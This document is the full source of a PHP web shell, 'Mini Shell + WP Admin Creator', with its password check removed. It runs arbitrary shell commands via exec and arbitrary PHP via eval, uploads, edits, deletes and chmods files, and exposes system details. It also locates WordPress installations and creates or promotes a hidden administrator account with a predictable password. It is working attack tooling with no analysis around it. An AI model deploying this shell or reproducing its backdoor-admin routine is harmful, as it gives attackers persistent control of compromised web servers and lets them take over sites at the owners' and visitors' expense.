<?php
/* Mini Shell - Lightweight Web Shell with WP Admin Creator */
session_start();

// ========== CONFIGURATION ==========
// Password removed

// ========== AUTHENTICATION ==========
// Authentication removed - directly show shell

// ========== FUNCTIONS ==========
function run_command($cmd) {
    $output = [];
    $return = 0;
    exec($cmd . ' 2>&1', $output, $return);
    return implode("\n", $output);
}

function get_current_path() {
    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    if (!is_dir($path)) $path = dirname($path);
    return realpath($path);
}

function format_size($bytes) {
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes / 1024, 2) . ' KB';
    if ($bytes < 1073741824) return round($bytes / 1048576, 2) . ' MB';
    return round($bytes / 1073741824, 2) . ' GB';
}

// ========== WORDPRESS ADMIN CREATOR ==========
function find_wp_config($start_path) {
    $current = $start_path;
    $max_depth = 10;
    $depth = 0;
    
    while ($depth < $max_depth && $current != '/' && $current != '') {
        if (file_exists($current . '/wp-config.php')) {
            return $current;
        }
        $current = dirname($current);
        $depth++;
    }
    return false;
}

function create_wp_admin($site_name) {
    $cwd = get_current_path();
    $wp_path = find_wp_config($cwd);
    
    if (!$wp_path) {
        return ['success' => false, 'message' => '❌ WordPress not found in current or parent directories'];
    }
    
    // Load WordPress
    define('WP_USE_THEMES', false);
    require_once($wp_path . '/wp-load.php');
    require_once($wp_path . '/wp-includes/pluggable.php');
    require_once($wp_path . '/wp-admin/includes/user.php');
    
    // Generate username and password based on site name
    $username = strtolower(preg_replace('/[^a-zA-Z0-9]/', '', $site_name));
    $password = $username . '123';
    $email = $username . '@' . $site_name . '.com';
    
    // Clean site name for display
    $display_name = ucfirst($username);
    
    // Check if user already exists
    $user_id = username_exists($username);
    if (!$user_id && !email_exists($email)) {
        // Create user
        $user_id = wp_create_user($username, $password, $email);
        
        if (!is_wp_error($user_id)) {
            // Make admin
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            
            // Update display name
            wp_update_user([
                'ID' => $user_id,
                'display_name' => $display_name,
                'nickname' => $display_name
            ]);
            
            // Get site URL
            $site_url = get_site_url();
            
            return [
                'success' => true,
                'message' => '✅ WordPress Admin Created Successfully!',
                'username' => $username,
                'password' => $password,
                'email' => $email,
                'site_url' => $site_url,
                'wp_path' => $wp_path
            ];
        } else {
            return ['success' => false, 'message' => '❌ Failed to create user: ' . $user_id->get_error_message()];
        }
    } else {
        if ($user_id) {
            // User exists, make sure they're admin
            $user = new WP_User($user_id);
            if (!$user->has_cap('administrator')) {
                $user->set_role('administrator');
                return [
                    'success' => true,
                    'message' => '⚠️ User already exists! Upgraded to administrator.',
                    'username' => $username,
                    'password' => $password,
                    'site_url' => get_site_url(),
                    'wp_path' => $wp_path
                ];
            } else {
                return [
                    'success' => false,
                    'message' => '⚠️ User already exists and is already an administrator!',
                    'username' => $username,
                    'site_url' => get_site_url()
                ];
            }
        } else {
            return ['success' => false, 'message' => '❌ Email already exists'];
        }
    }
}

function scan_for_wordpress() {
    $cwd = get_current_path();
    $found = [];
    
    // Check current directory
    if (file_exists($cwd . '/wp-config.php')) {
        $found[] = $cwd;
    }
    
    // Check parent directories (up to 5 levels)
    $current = dirname($cwd);
    $depth = 0;
    while ($depth < 5 && $current != '/' && $current != '') {
        if (file_exists($current . '/wp-config.php')) {
            $found[] = $current;
        }
        $current = dirname($current);
        $depth++;
    }
    
    // Check subdirectories (only first level)
    $items = scandir($cwd);
    foreach ($items as $item) {
        if ($item != '.' && $item != '..' && is_dir($cwd . '/' . $item)) {
            if (file_exists($cwd . '/' . $item . '/wp-config.php')) {
                $found[] = $cwd . '/' . $item;
            }
        }
    }
    
    return array_unique($found);
}

// ========== HANDLE ACTIONS ==========
$cwd = get_current_path();
$message = '';
$wp_result = null;

// WordPress Admin Creation
if (isset($_POST['create_wp_admin'])) {
    $site_name = $_POST['site_name'];
    if (!empty($site_name)) {
        $wp_result = create_wp_admin($site_name);
    } else {
        $message = "❌ Please enter a site name";
    }
}

// File upload
if (isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $message = "✓ Uploaded: " . basename($_FILES['file']['name']);
    } else {
        $message = "✗ Upload failed";
    }
}

// Create file/directory
if (isset($_POST['create'])) {
    $target = $cwd . '/' . basename($_POST['name']);
    if ($_POST['type'] === 'dir') {
        if (mkdir($target)) $message = "✓ Created directory";
        else $message = "✗ Failed to create directory";
    } else {
        if (file_put_contents($target, '') !== false) $message = "✓ Created file";
        else $message = "✗ Failed to create file";
    }
}

// Delete
if (isset($_GET['delete'])) {
    $target = $cwd . '/' . basename($_GET['delete']);
    if (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        if (empty($files)) {
            if (rmdir($target)) $message = "✓ Deleted directory";
            else $message = "✗ Delete failed";
        } else {
            $message = "✗ Directory not empty (use ?force=1)";
        }
    } else {
        if (unlink($target)) $message = "✓ Deleted file";
        else $message = "✗ Delete failed";
    }
}

// Force delete directory
if (isset($_GET['force']) && isset($_GET['delete'])) {
    $target = $cwd . '/' . basename($_GET['delete']);
    system("rm -rf " . escapeshellarg($target));
    $message = "✓ Force deleted: " . basename($_GET['delete']);
}

// Save file
if (isset($_POST['save'])) {
    $file = $cwd . '/' . basename($_POST['file']);
    if (file_put_contents($file, $_POST['content']) !== false) {
        $message = "✓ Saved: " . basename($_POST['file']);
    }
}

// Rename
if (isset($_POST['rename_submit'])) {
    $old = $cwd . '/' . basename($_POST['old']);
    $new = $cwd . '/' . basename($_POST['new']);
    if (rename($old, $new)) {
        $message = "✓ Renamed to: " . basename($_POST['new']);
    }
}

// Chmod
if (isset($_POST['chmod_submit'])) {
    $target = $cwd . '/' . basename($_POST['file']);
    $mode = octdec($_POST['mode']);
    if (chmod($target, $mode)) {
        $message = "✓ Changed permissions to " . $_POST['mode'];
    }
}

// Execute command
$cmd_output = '';
if (isset($_POST['cmd'])) {
    $cmd_output = run_command($_POST['cmd']);
}

// PHP code execution
$php_output = '';
if (isset($_POST['php_code'])) {
    ob_start();
    eval($_POST['php_code']);
    $php_output = ob_get_clean();
}

// Scan for WordPress
$wp_installations = scan_for_wordpress();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Mini Shell - WP Admin Creator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0e10;
            font-family: 'Courier New', 'Fira Code', monospace;
            font-size: 13px;
            padding: 15px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        /* Header */
        .header {
            background: linear-gradient(90deg, #1a1a2e 0%, #16213e 100%);
            padding: 15px 20px;
            border-radius: 8px 8px 0 0;
            border-bottom: 2px solid #00ff88;
            margin-bottom: 20px;
        }
        .header h1 {
            display: inline-block;
            color: #00ff88;
            font-size: 20px;
        }
        .header span {
            float: right;
            color: #888;
            font-size: 12px;
        }
        /* Message */
        .message {
            background: #1a1a2e;
            padding: 10px 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            color: #00ff88;
            border-left: 3px solid #00ff88;
        }
        .message.error {
            border-left-color: #ff4444;
            color: #ff8888;
        }
        /* Path bar */
        .path {
            background: #111;
            padding: 12px 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-family: monospace;
            word-break: break-all;
        }
        .path a {
            color: #00ff88;
            text-decoration: none;
        }
        .path a:hover {
            text-decoration: underline;
        }
        /* Toolbar */
        .toolbar {
            background: #111;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .toolbar input, .toolbar select, .toolbar button {
            background: #1a1a2e;
            border: 1px solid #333;
            color: #e0e0e0;
            padding: 8px 12px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
        }
        .toolbar button {
            background: #00ff88;
            color: #000;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        .toolbar button:hover {
            background: #00cc66;
        }
        /* WordPress Panel */
        .wp-panel {
            background: linear-gradient(135deg, #1a1a2e 0%, #0f0f1a 100%);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border: 1px solid #00ff8844;
        }
        .wp-panel h3 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 18px;
        }
        .wp-panel input {
            background: #0a0a0a;
            border: 1px solid #00ff88;
            color: #00ff88;
            padding: 10px 15px;
            width: 300px;
            font-family: monospace;
            margin-right: 10px;
        }
        .wp-panel button {
            background: #00ff88;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        .wp-result {
            margin-top: 15px;
            padding: 15px;
            background: #0a0a0a;
            border-radius: 6px;
        }
        .wp-result.success {
            border-left: 3px solid #00ff88;
        }
        .wp-result.error {
            border-left: 3px solid #ff4444;
        }
        .wp-result h4 {
            color: #00ff88;
            margin-bottom: 10px;
        }
        .credential {
            background: #1a1a2e;
            padding: 10px;
            margin: 10px 0;
            font-family: monospace;
        }
        .wp-list {
            margin-top: 15px;
            font-size: 12px;
        }
        .wp-list ul {
            margin-top: 10px;
            list-style: none;
        }
        .wp-list li {
            color: #aaa;
            padding: 5px 0;
        }
        /* File table */
        table {
            width: 100%;
            background: #111;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        th {
            background: #1a1a2e;
            padding: 10px;
            text-align: left;
            color: #00ff88;
            font-weight: normal;
        }
        td {
            padding: 8px 10px;
            border-bottom: 1px solid #1a1a2e;
        }
        tr:hover {
            background: #1a1a2e;
        }
        .dir {
            color: #ffaa44;
            text-decoration: none;
            font-weight: bold;
        }
        .file {
            color: #00ff88;
            text-decoration: none;
        }
        .actions a {
            text-decoration: none;
            padding: 2px 6px;
            border-radius: 3px;
            margin: 0 2px;
            font-size: 11px;
        }
        .edit { background: #4a90e2; color: white; }
        .del { background: #e24a4a; color: white; }
        .rename { background: #e2b84a; color: white; }
        .chmod { background: #8a6e4a; color: white; }
        /* Editor */
        .editor {
            background: #111;
            padding: 20px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .editor textarea {
            width: 100%;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff88;
            padding: 12px;
            font-family: monospace;
            font-size: 12px;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        /* Console */
        .console {
            background: #111;
            padding: 20px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .console h3 {
            color: #00ff88;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .console input {
            width: 70%;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff88;
            padding: 10px;
            font-family: monospace;
        }
        .console pre {
            background: #0a0a0a;
            padding: 15px;
            margin-top: 10px;
            overflow-x: auto;
            color: #e0e0e0;
            border-radius: 4px;
        }
        hr {
            border-color: #1a1a2e;
            margin: 20px 0;
        }
        .badge {
            display: inline-block;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 10px;
        }
        .badge-dir { background: #ffaa4433; color: #ffaa44; }
        .badge-file { background: #00ff8833; color: #00ff88; }
        .badge-wp { background: #21759b33; color: #21759b; }
        .highlight {
            color: #00ff88;
            font-weight: bold;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ Mini Shell + WP Admin Creator</h1>
        <span><?php echo php_uname('n'); ?> | PHP <?php echo phpversion(); ?></span>
    </div>

    <?php if ($message): ?>
        <div class="message"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>

    <!-- WORDPRESS ADMIN CREATOR PANEL -->
    <div class="wp-panel">
        <h3>🔧 WordPress Admin Creator</h3>
        <p style="margin-bottom: 15px; color: #aaa;">Enter site name (e.g., google.com) → Username: <span class="highlight">google</span> | Password: <span class="highlight">google123</span></p>
        <form method="post">
            <input type="text" name="site_name" placeholder="Enter website domain or name" required>
            <button type="submit" name="create_wp_admin">🚀 Create WP Admin</button>
        </form>
        
        <?php if ($wp_result): ?>
            <div class="wp-result <?php echo $wp_result['success'] ? 'success' : 'error'; ?>">
                <h4><?php echo $wp_result['message']; ?></h4>
                <?php if ($wp_result['success']): ?>
                    <div class="credential">
                        <strong>🔑 Login Credentials:</strong><br>
                        <strong>Username:</strong> <?php echo htmlspecialchars($wp_result['username']); ?><br>
                        <strong>Password:</strong> <?php echo htmlspecialchars($wp_result['password']); ?><br>
                        <strong>Email:</strong> <?php echo htmlspecialchars($wp_result['email']); ?><br>
                        <strong>Login URL:</strong> <a href="<?php echo htmlspecialchars($wp_result['site_url']); ?>/wp-admin" target="_blank" style="color: #00ff88;"><?php echo htmlspecialchars($wp_result['site_url']); ?>/wp-admin</a>
                    </div>
                    <div style="font-size: 12px; color: #888; margin-top: 10px;">
                        WordPress Path: <?php echo htmlspecialchars($wp_result['wp_path']); ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <!-- Detected WordPress Installations -->
        <?php if (!empty($wp_installations)): ?>
        <div class="wp-list">
            <strong>📂 Detected WordPress installations:</strong>
            <ul>
                <?php foreach ($wp_installations as $wp): ?>
                    <li>🔹 <?php echo htmlspecialchars($wp); ?></li>
                <?php endforeach; ?>
            </ul>
        </div>
        <?php else: ?>
        <div class="wp-list">
            <span style="color: #888;">ℹ️ No WordPress installation detected in current or parent directories</span>
        </div>
        <?php endif; ?>
    </div>

    <!-- Path navigation -->
    <div class="path">
        📁 <strong>Current:</strong> 
        <a href="?path=/">/</a>
        <?php 
        $parts = explode('/', trim($cwd, '/'));
        $build = '';
        foreach ($parts as $p):
            if (empty($p)) continue;
            $build .= '/' . $p;
        ?>
            / <a href="?path=<?php echo urlencode($build); ?>"><?php echo htmlspecialchars($p); ?></a>
        <?php endforeach; ?>
    </div>

    <!-- Toolbar -->
    <div class="toolbar">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">📤 Upload</button>
        </form>
        
        <form method="post">
            <input type="text" name="name" placeholder="name" required style="width: 150px;">
            <select name="type">
                <option value="file">File</option>
                <option value="dir">Directory</option>
            </select>
            <button type="submit" name="create">📄 Create</button>
        </form>
        
        <form method="post" style="margin-left: auto;">
            <input type="text" name="cmd" placeholder="$ command" style="width: 300px;">
            <button type="submit">▶ Run</button>
        </form>
    </div>

    <!-- File listing -->
    <?php
    $items = scandir($cwd);
    if ($items):
    ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Perms</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($items as $item): 
                if ($item == '.' || $item == '..') continue;
                $full = $cwd . '/' . $item;
                $is_dir = is_dir($full);
                $perms = substr(sprintf('%o', fileperms($full)), -4);
                $is_wp = file_exists($full . '/wp-config.php') || $item == 'wp-admin';
            ?>
            <tr>
                <td>
                    <?php if ($is_dir): ?>
                        <a href="?path=<?php echo urlencode($full); ?>" class="dir">📁 <?php echo htmlspecialchars($item); ?></a>
                        <?php if ($is_wp): ?> <span class="badge badge-wp">WP</span><?php endif; ?>
                    <?php else: ?>
                        <a href="?edit=<?php echo urlencode($item); ?>&path=<?php echo urlencode($cwd); ?>" class="file">📄 <?php echo htmlspecialchars($item); ?></a>
                    <?php endif; ?>
                </td>
                <td><?php echo $is_dir ? '&lt;DIR&gt;' : format_size(filesize($full)); ?></td>
                <td><span class="badge <?php echo $is_dir ? 'badge-dir' : 'badge-file'; ?>"><?php echo $perms; ?></span></td>
                <td><?php echo date('m-d H:i', filemtime($full)); ?></td>
                <td class="actions">
                    <?php if (!$is_dir): ?>
                        <a href="?edit=<?php echo urlencode($item); ?>&path=<?php echo urlencode($cwd); ?>" class="edit">Edit</a>
                    <?php endif; ?>
                    <a href="?rename=<?php echo urlencode($item); ?>&path=<?php echo urlencode($cwd); ?>" class="rename">Rename</a>
                    <a href="?delete=<?php echo urlencode($item); ?>&path=<?php echo urlencode($cwd); ?>" class="del" onclick="return confirm('Delete?')">Del</a>
                    <a href="?chmod=<?php echo urlencode($item); ?>&path=<?php echo urlencode($cwd); ?>" class="chmod">Chmod</a>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php endif; ?>

    <!-- File editor -->
    <?php if (isset($_GET['edit'])): 
        $edit_file = $cwd . '/' . basename($_GET['edit']);
        if (file_exists($edit_file) && !is_dir($edit_file)):
    ?>
    <div class="editor">
        <h3>✏️ Editing: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
        <form method="post">
            <input type="hidden" name="file" value="<?php echo basename($edit_file); ?>">
            <textarea name="content" rows="20"><?php echo htmlspecialchars(file_get_contents($edit_file)); ?></textarea>
            <button type="submit" name="save">💾 Save</button>
        </form>
    </div>
    <?php endif; endif; ?>

    <!-- Rename form -->
    <?php if (isset($_GET['rename'])): ?>
    <div class="console">
        <h3>🔄 Rename: <?php echo htmlspecialchars($_GET['rename']); ?></h3>
        <form method="post">
            <input type="hidden" name="old" value="<?php echo htmlspecialchars($_GET['rename']); ?>">
            <input type="text" name="new" value="<?php echo htmlspecialchars($_GET['rename']); ?>" style="width: 300px;">
            <button type="submit" name="rename_submit">Rename</button>
        </form>
    </div>
    <?php endif; ?>

    <!-- Chmod form -->
    <?php if (isset($_GET['chmod'])): 
        $chmod_file = $cwd . '/' . basename($_GET['chmod']);
        $current_perms = substr(sprintf('%o', fileperms($chmod_file)), -4);
    ?>
    <div class="console">
        <h3>🔒 Chmod: <?php echo htmlspecialchars($_GET['chmod']); ?> (current: <?php echo $current_perms; ?>)</h3>
        <form method="post">
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['chmod']); ?>">
            <input type="text" name="mode" placeholder="0755" value="<?php echo $current_perms; ?>" style="width: 150px;">
            <button type="submit" name="chmod_submit">Apply</button>
        </form>
    </div>
    <?php endif; ?>

    <!-- Command output -->
    <?php if ($cmd_output): ?>
    <div class="console">
        <h3>💻 Command Output</h3>
        <pre><?php echo htmlspecialchars($cmd_output); ?></pre>
    </div>
    <?php endif; ?>

    <!-- PHP Console -->
    <div class="console">
        <h3>🐘 PHP Console</h3>
        <form method="post">
            <textarea name="php_code" rows="5" placeholder="&lt;?php&#10;echo 'Hello World';&#10;?>" style="width:100%; background:#0a0a0a; border:1px solid #333; color:#00ff88; padding:10px; font-family:monospace;"></textarea>
            <button type="submit" style="margin-top:10px;">▶ Execute PHP</button>
        </form>
        <?php if ($php_output): ?>
            <pre><?php echo htmlspecialchars($php_output); ?></pre>
        <?php endif; ?>
    </div>

    <!-- System info -->
    <div class="console">
        <h3>ℹ️ System Info</h3>
        <pre><?php
        echo "User: " . (function_exists('get_current_user') ? get_current_user() : 'N/A') . "\n";
        echo "UID: " . (function_exists('posix_geteuid') ? posix_geteuid() : 'N/A') . "\n";
        echo "CWD: " . getcwd() . "\n";
        echo "OS: " . php_uname() . "\n";
        echo "Disabled Functions: " . (ini_get('disable_functions') ?: 'none') . "\n";
        ?></pre>
    </div>
</div>
</body>
</html>
<?php
?>
